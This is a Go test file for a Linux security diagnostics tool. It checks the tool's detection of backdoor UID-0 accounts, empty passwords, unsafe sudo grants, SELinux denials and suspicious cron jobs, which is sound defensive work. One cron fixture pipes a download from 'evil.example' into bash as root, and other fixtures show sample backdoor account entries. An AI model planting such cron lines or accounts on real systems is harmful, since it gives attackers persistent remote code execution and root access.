//go:build linux

package collectors

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/keyorixhq/dashdiag/internal/models"
	"github.com/keyorixhq/dashdiag/internal/source"
)

// Tests using the direct source.Bundle fixture-seeding API (PutFile/PutDir/
// PutGlob/PutStat) to exercise real collector functions that read hardcoded
// system paths, without touching the actual filesystem. Each test swaps
// activeSource for the duration via SetSource/defer.

func withFixtureSource(t *testing.T, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	seed(b)
	prev := SetSource(source.NewReplay(b))
	t.Cleanup(func() { SetSource(prev) })
}

// fakeCombinedSource layers a Cached-key override (Bundle has no public
// Cached-seeding API — lookpath/<tool>, imds/<url>, dial/<network>/<addr>,
// env/<var>, platform/container-context, ... all route through Cached) and a
// Readlink override (Bundle has no public Readlink-seeding API either) on top
// of a Bundle-backed Replay, so ONE active source can serve every fixture
// dimension a test needs at once.
//
// GUARD — use this instead of chaining two separate with*Fixture calls.
// SetSource fully REPLACES the active source; it does not merge with whatever
// the previous call configured. Calling e.g. seedDialOutcome(t, ...) and then
// withFixtureSource(t, ...) silently throws away the dial-outcome seed, because
// the second SetSource overwrites the first — the function under test then
// sees only the second fixture's data. This bit the containerd_linux.go round
// (2026-07-08): a Collect() test needed BOTH a dial/unix/<socket> outcome AND
// PutCmd-seeded systemctl/ctr output in the SAME call, and two independent
// SetSource calls meant only the last one survived. Whenever a test needs more
// than one fixture dimension for a single function-under-test call, seed them
// ALL into one withCombinedFixture call rather than stacking separate
// with*Fixture helpers.
type fakeCombinedSource struct {
	*source.Replay
	cached map[string][]byte
	links  map[string]string
}

func (f *fakeCombinedSource) Cached(key string, _ func() ([]byte, error)) ([]byte, error) {
	if v, ok := f.cached[key]; ok {
		return v, nil
	}
	return nil, errNotFoundCVE
}

func (f *fakeCombinedSource) Readlink(path string) (string, error) {
	if target, ok := f.links[path]; ok {
		return target, nil
	}
	return f.Replay.Readlink(path)
}

// withCombinedFixture seeds a Bundle (PutFile/PutDir/PutCmd/PutStat/PutGlob), a
// Cached-key map, and a Readlink map into ONE active source for the test's
// duration. Pass nil for cached/links when a dimension isn't needed.
func withCombinedFixture(t *testing.T, cached map[string][]byte, links map[string]string, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	if seed != nil {
		seed(b)
	}
	prev := SetSource(&fakeCombinedSource{Replay: source.NewReplay(b), cached: cached, links: links})
	t.Cleanup(func() { SetSource(prev) })
}

func TestIsOffensiveDistro(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/os-release", []byte(`ID=kali`+"\n"+`ID_LIKE=debian`+"\n"))
	})
	if !isOffensiveDistro() {
		t.Error("Kali should be recognized as an offensive distro")
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/os-release", []byte(`ID=ubuntu`+"\n"))
	})
	if isOffensiveDistro() {
		t.Error("Ubuntu must not be flagged as an offensive distro")
	}
}

func TestParseUID0Users(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/passwd", []byte("root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/home/backdoor:/bin/sh\ndeploy:x:1000:1000::/home/deploy:/bin/bash\n"))
	})
	info := &models.SecurityInfo{}
	parseUID0Users(info)
	if len(info.UID0Users) != 1 || info.UID0Users[0] != "backdoor" {
		t.Errorf("a non-root UID-0 account should be flagged, got %v", info.UID0Users)
	}
}

func TestParseFIPS(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/proc/sys/crypto/fips_enabled", []byte("1\n"))
	})
	info := &models.SecurityInfo{}
	parseFIPS(info)
	if !info.FIPSEnabled {
		t.Error("fips_enabled=1 should set FIPSEnabled true")
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/proc/sys/crypto/fips_enabled", []byte("0\n"))
	})
	info2 := &models.SecurityInfo{}
	parseFIPS(info2)
	if info2.FIPSEnabled {
		t.Error("fips_enabled=0 should leave FIPSEnabled false")
	}
}

// TestParsePasswordAging guards the two security-critical audits driven off
// /etc/shadow: an empty password field (CRIT — no password protection at all)
// and a human account with password expiry disabled (WARN). Root accounts and
// system accounts (UID < 1000) must not trigger the expiry check even with
// max=99999, since that's normal for service accounts.
func TestParsePasswordAging(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/passwd", []byte(
			"root:x:0:0:root:/root:/bin/bash\n"+
				"deploy:x:1000:1000::/home/deploy:/bin/bash\n"+
				"daemon:x:1:1::/nonexistent:/usr/sbin/nologin\n",
		))
		b.PutFile("/etc/shadow", []byte(
			"root:$6$abc:19700:0:99999:7:::\n"+ // normal root, has a password
				"nopass::19700:0:99999:7:::\n"+ // empty password field — CRIT
				"deploy:$6$xyz:19700:0:99999:7:::\n"+ // human account, never expires — WARN
				"daemon:*:19700:0:99999:7:::\n", // system account, never expires — must NOT warn
		))
	})
	info := &models.SecurityInfo{}
	parsePasswordAging(info)

	if len(info.EmptyPasswordAccounts) != 1 || info.EmptyPasswordAccounts[0] != "nopass" {
		t.Errorf("the empty-password account should be flagged, got %v", info.EmptyPasswordAccounts)
	}
	if len(info.StalePasswordAccounts) != 1 || info.StalePasswordAccounts[0] != "deploy" {
		t.Errorf("only the human account with max=99999 should be flagged, got %v", info.StalePasswordAccounts)
	}
}

// TestParsePasswordAgingAbsentShadowNotFlaggedUnreadable guards the "absent vs
// permission-denied" distinction from the doc comment: when /etc/shadow simply
// isn't there (not a permission error), ShadowUnreadable must stay false —
// only an actual os.IsPermission error should flip it, so the verdict doesn't
// falsely say "not audited" on a host where there's genuinely nothing to audit.
func TestParsePasswordAgingAbsentShadowNotFlaggedUnreadable(t *testing.T) {
	withFixtureSource(t, func(_ *source.Bundle) {}) // /etc/shadow never seeded
	info := &models.SecurityInfo{}
	parsePasswordAging(info)
	if info.ShadowUnreadable {
		t.Error("an absent (not permission-denied) shadow file must not report unreadable")
	}
}

func TestParseWorldWritable(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		// /tmp: world-writable WITH sticky bit — safe, must not be flagged.
		b.PutStat("/tmp", source.FileMeta{Mode: os.ModeSticky | 0o777})
		// /var/tmp: world-writable WITHOUT sticky bit — the classic tmp-race
		// privilege escalation vector, must be flagged.
		b.PutStat("/var/tmp", source.FileMeta{Mode: 0o777})
		// /dev/shm: not world-writable at all — must not be flagged.
		b.PutStat("/dev/shm", source.FileMeta{Mode: 0o755})
	})
	info := &models.SecurityInfo{}
	parseWorldWritable(info)
	if len(info.WorldWritableDirs) != 1 || info.WorldWritableDirs[0] != "/var/tmp" {
		t.Errorf("only the world-writable dir missing its sticky bit should be flagged, got %v", info.WorldWritableDirs)
	}
}

// TestParseAVCGroups guards the SELinux denial-grouping logic: an enforced
// denial within the window must be grouped and counted, a permissive=1 record
// (logged but not blocked) must be excluded, and a denial outside the window
// must not count either.
func TestParseAVCGroups(t *testing.T) {
	now := time.Now()
	recent := now.Add(-30 * time.Second).Unix()
	old := now.Add(-2 * time.Hour).Unix()

	enforced := fmt.Sprintf(`type=AVC msg=audit(%d.123:456): avc:  denied  { read } for  pid=1234 comm="httpd" name="shadow" scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0`, recent)
	permissive := fmt.Sprintf(`type=AVC msg=audit(%d.124:457): avc:  denied  { search } for  pid=1479 comm="lsblk" scontext=system_u:system_r:bootupd_t:s0 tcontext=system_u:object_r:mount_var_run_t:s0 tclass=dir permissive=1`, recent)
	outsideWindow := fmt.Sprintf(`type=AVC msg=audit(%d.125:458): avc:  denied  { write } for  pid=1 comm="init" scontext=system_u:system_r:init_t:s0 tcontext=system_u:object_r:init_t:s0 tclass=file permissive=0`, old)

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/audit/audit.log", []byte(enforced+"\n"+permissive+"\n"+outsideWindow+"\n"))
	})

	groups := parseAVCGroups(nil, time.Hour) //nolint:staticcheck // ctx unused by this function
	if len(groups) != 1 {
		t.Fatalf("expected 1 group (only the enforced, in-window denial), got %d: %+v", len(groups), groups)
	}
	if groups[0].Tclass != "file" || groups[0].Count != 1 {
		t.Errorf("the enforced httpd/shadow denial should be the sole group, got %+v", groups[0])
	}
}

// TestParseSuspectCrons guards the cron-persistence detection: a job piping to
// a shell or writing into a system/world-writable path must be flagged, a
// benign job must not, and comment/blank lines must be skipped.
func TestParseSuspectCrons(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/etc/cron.d", []string{"backdoor", "legit"})
		b.PutFile("/etc/cron.d/backdoor", []byte(
			"# comment, ignored\n"+
				"\n"+ // blank line, ignored
				"*/5 * * * * root curl http://evil.example/x.sh | bash\n",
		))
		b.PutFile("/etc/cron.d/legit", []byte("0 3 * * * root /usr/local/bin/backup.sh\n"))
		// Other cron dirs simply aren't seeded — must be skipped, not error out.
	})
	info := &models.SecurityInfo{}
	parseSuspectCrons(info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected exactly 1 suspect entry (the pipe-to-bash job), got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "backdoor") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseSudoers guards the sudo NOPASSWD audit: a specific-command NOPASSWD
// for "ALL" users is benign noise (skipped), but a full "NOPASSWD: ALL" grant
// for a real user must be reported.
func TestParseSudoers(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/etc/sudoers", []byte("root ALL=(ALL:ALL) ALL\n"))
		b.PutGlob("/etc/sudoers.d/*", []string{"/etc/sudoers.d/90-deploy", "/etc/sudoers.d/91-benign"})
		b.PutFile("/etc/sudoers.d/90-deploy", []byte("deploy ALL=(ALL) NOPASSWD: ALL\n"))
		b.PutFile("/etc/sudoers.d/91-benign", []byte("ALL ALL=(root) NOPASSWD: /usr/sbin/mintdrivers\n"))
	})
	info := &models.SecurityInfo{}
	parseSudoers(info)

	if len(info.SudoNopasswd) != 1 || info.SudoNopasswd[0] != "deploy" {
		t.Errorf("only the full-escalation deploy grant should be reported (the ALL-users specific-command grant is benign noise), got %v", info.SudoNopasswd)
	}
}

// TestParsePAMFailureLine guards the (service, user) extraction boundary
// cases: a valid non-sshd failure line, the sshd EXCLUSION (already covered
// by FailedLogins under a different 1h/IP counter — double-counting it here
// would confuse the verdict), and malformed/incomplete lines.
func TestParsePAMFailureLine(t *testing.T) {
	tests := []struct {
		name        string
		line        string
		wantOK      bool
		wantService string
		wantUser    string
	}{
		{
			name:        "sudo failure",
			line:        "Jul  8 10:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob",
			wantOK:      true,
			wantService: "sudo",
			wantUser:    "bob",
		},
		{
			name:        "su failure",
			line:        "Jul  8 10:05:00 host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/1 ruser=bob rhost=  user=root",
			wantOK:      true,
			wantService: "su",
			wantUser:    "root",
		},
		{
			name:   "sshd is excluded",
			line:   "Jul  8 09:00:00 host sshd: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=1.2.3.4  user=eve",
			wantOK: false,
		},
		{
			name:   "missing authentication failure substring",
			line:   "Jul  8 10:00:01 host sudo: pam_unix(sudo:session): session opened for user root by bob(uid=1000)",
			wantOK: false,
		},
		{
			name:   "missing user field",
			line:   "Jul  8 10:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=",
			wantOK: false,
		},
		{
			name:   "malformed line",
			line:   "not a pam line at all",
			wantOK: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			k, ok := parsePAMFailureLine(tt.line)
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v (key=%+v)", ok, tt.wantOK, k)
			}
			if ok && (k.service != tt.wantService || k.user != tt.wantUser) {
				t.Errorf("got service=%q user=%q, want service=%q user=%q", k.service, k.user, tt.wantService, tt.wantUser)
			}
		})
	}
}

// TestParsePAMModuleFailures_FromLogFile guards the end-to-end 24h-window
// collection: a recent non-sshd failure is grouped and counted, a failure
// inside 24h but OUTSIDE the existing 1h SSH-brute-force window is still
// included (proving the two counters are genuinely independent, not
// redundant), an sshd failure is filtered out, and a >24h-old failure is
// excluded by the recency gate.
func TestParsePAMModuleFailures_FromLogFile(t *testing.T) {
	now := time.Now()
	recent := now.Add(-5 * time.Minute).Format(time.Stamp)
	within24hOutside1h := now.Add(-2 * time.Hour).Format(time.Stamp)
	tooOld := now.Add(-25 * time.Hour).Format(time.Stamp)

	lines := []string{
		fmt.Sprintf("%s host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob", recent),
		fmt.Sprintf("%s host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/1 ruser=bob rhost=  user=root", within24hOutside1h),
		fmt.Sprintf("%s host sshd: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=1.2.3.4  user=eve", recent),
		fmt.Sprintf("%s host su: pam_unix(su:auth): authentication failure; logname= uid=1000 euid=0 tty=pts/2 ruser=bob rhost=  user=root", tooOld),
	}

	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/auth.log", []byte(strings.Join(lines, "\n")+"\n"))
		b.PutStat("/var/log/auth.log", source.FileMeta{Mode: 0o644})
	})

	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)

	if len(info.PAMModuleFailures) != 2 {
		t.Fatalf("expected exactly 2 groups (sudo/bob and su/root, in-window, non-sshd), got %d: %+v", len(info.PAMModuleFailures), info.PAMModuleFailures)
	}
	want := map[string]int{"sudo:bob": 1, "su:root": 1}
	for _, f := range info.PAMModuleFailures {
		key := f.Service + ":" + f.User
		if want[key] != f.Count {
			t.Errorf("unexpected group %+v (want count %d for %s)", f, want[key], key)
		}
	}
}

// TestParsePAMModuleFailures_NoLogFiles_FallsBackToJournal guards the
// journald-only fallback path (Debian 13+, no /var/log/secure or auth.log):
// the exact journalctl args must match what parsePAMModuleFailures/
// pamFailuresFromJournal actually invokes, or the fixture silently misses
// and the test passes vacuously on the `err != nil → return nil` branch.
func TestParsePAMModuleFailures_NoLogFiles_FallsBackToJournal(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutCmd("journalctl",
			[]string{"--since=24 hours ago", "--no-pager", "-q", "-g", "pam_unix.*authentication failure"},
			"Jul  8 10:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 euid=0 tty=/dev/pts/0 ruser=bob rhost=  user=bob\n",
			0)
	})

	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)

	if len(info.PAMModuleFailures) != 1 || info.PAMModuleFailures[0].Service != "sudo" || info.PAMModuleFailures[0].User != "bob" {
		t.Fatalf("expected the journalctl fallback to be parsed, got %+v", info.PAMModuleFailures)
	}
}

// TestParsePAMModuleFailures_Clean guards the zero-matches boundary: a log
// file present but with no matching PAM failure lines must leave
// PAMModuleFailures nil, not an empty-but-non-nil slice or a spurious entry.
func TestParsePAMModuleFailures_Clean(t *testing.T) {
	withFixtureSource(t, func(b *source.Bundle) {
		b.PutFile("/var/log/auth.log", []byte("Jul  8 10:00:01 host CRON[123]: pam_unix(cron:session): session opened for user root by (uid=0)\n"))
		b.PutStat("/var/log/auth.log", source.FileMeta{Mode: 0o644})
	})
	info := &models.SecurityInfo{}
	parsePAMModuleFailures(context.Background(), info)
	if len(info.PAMModuleFailures) != 0 {
		t.Errorf("no matching failure lines should leave PAMModuleFailures empty, got %+v", info.PAMModuleFailures)
	}
}
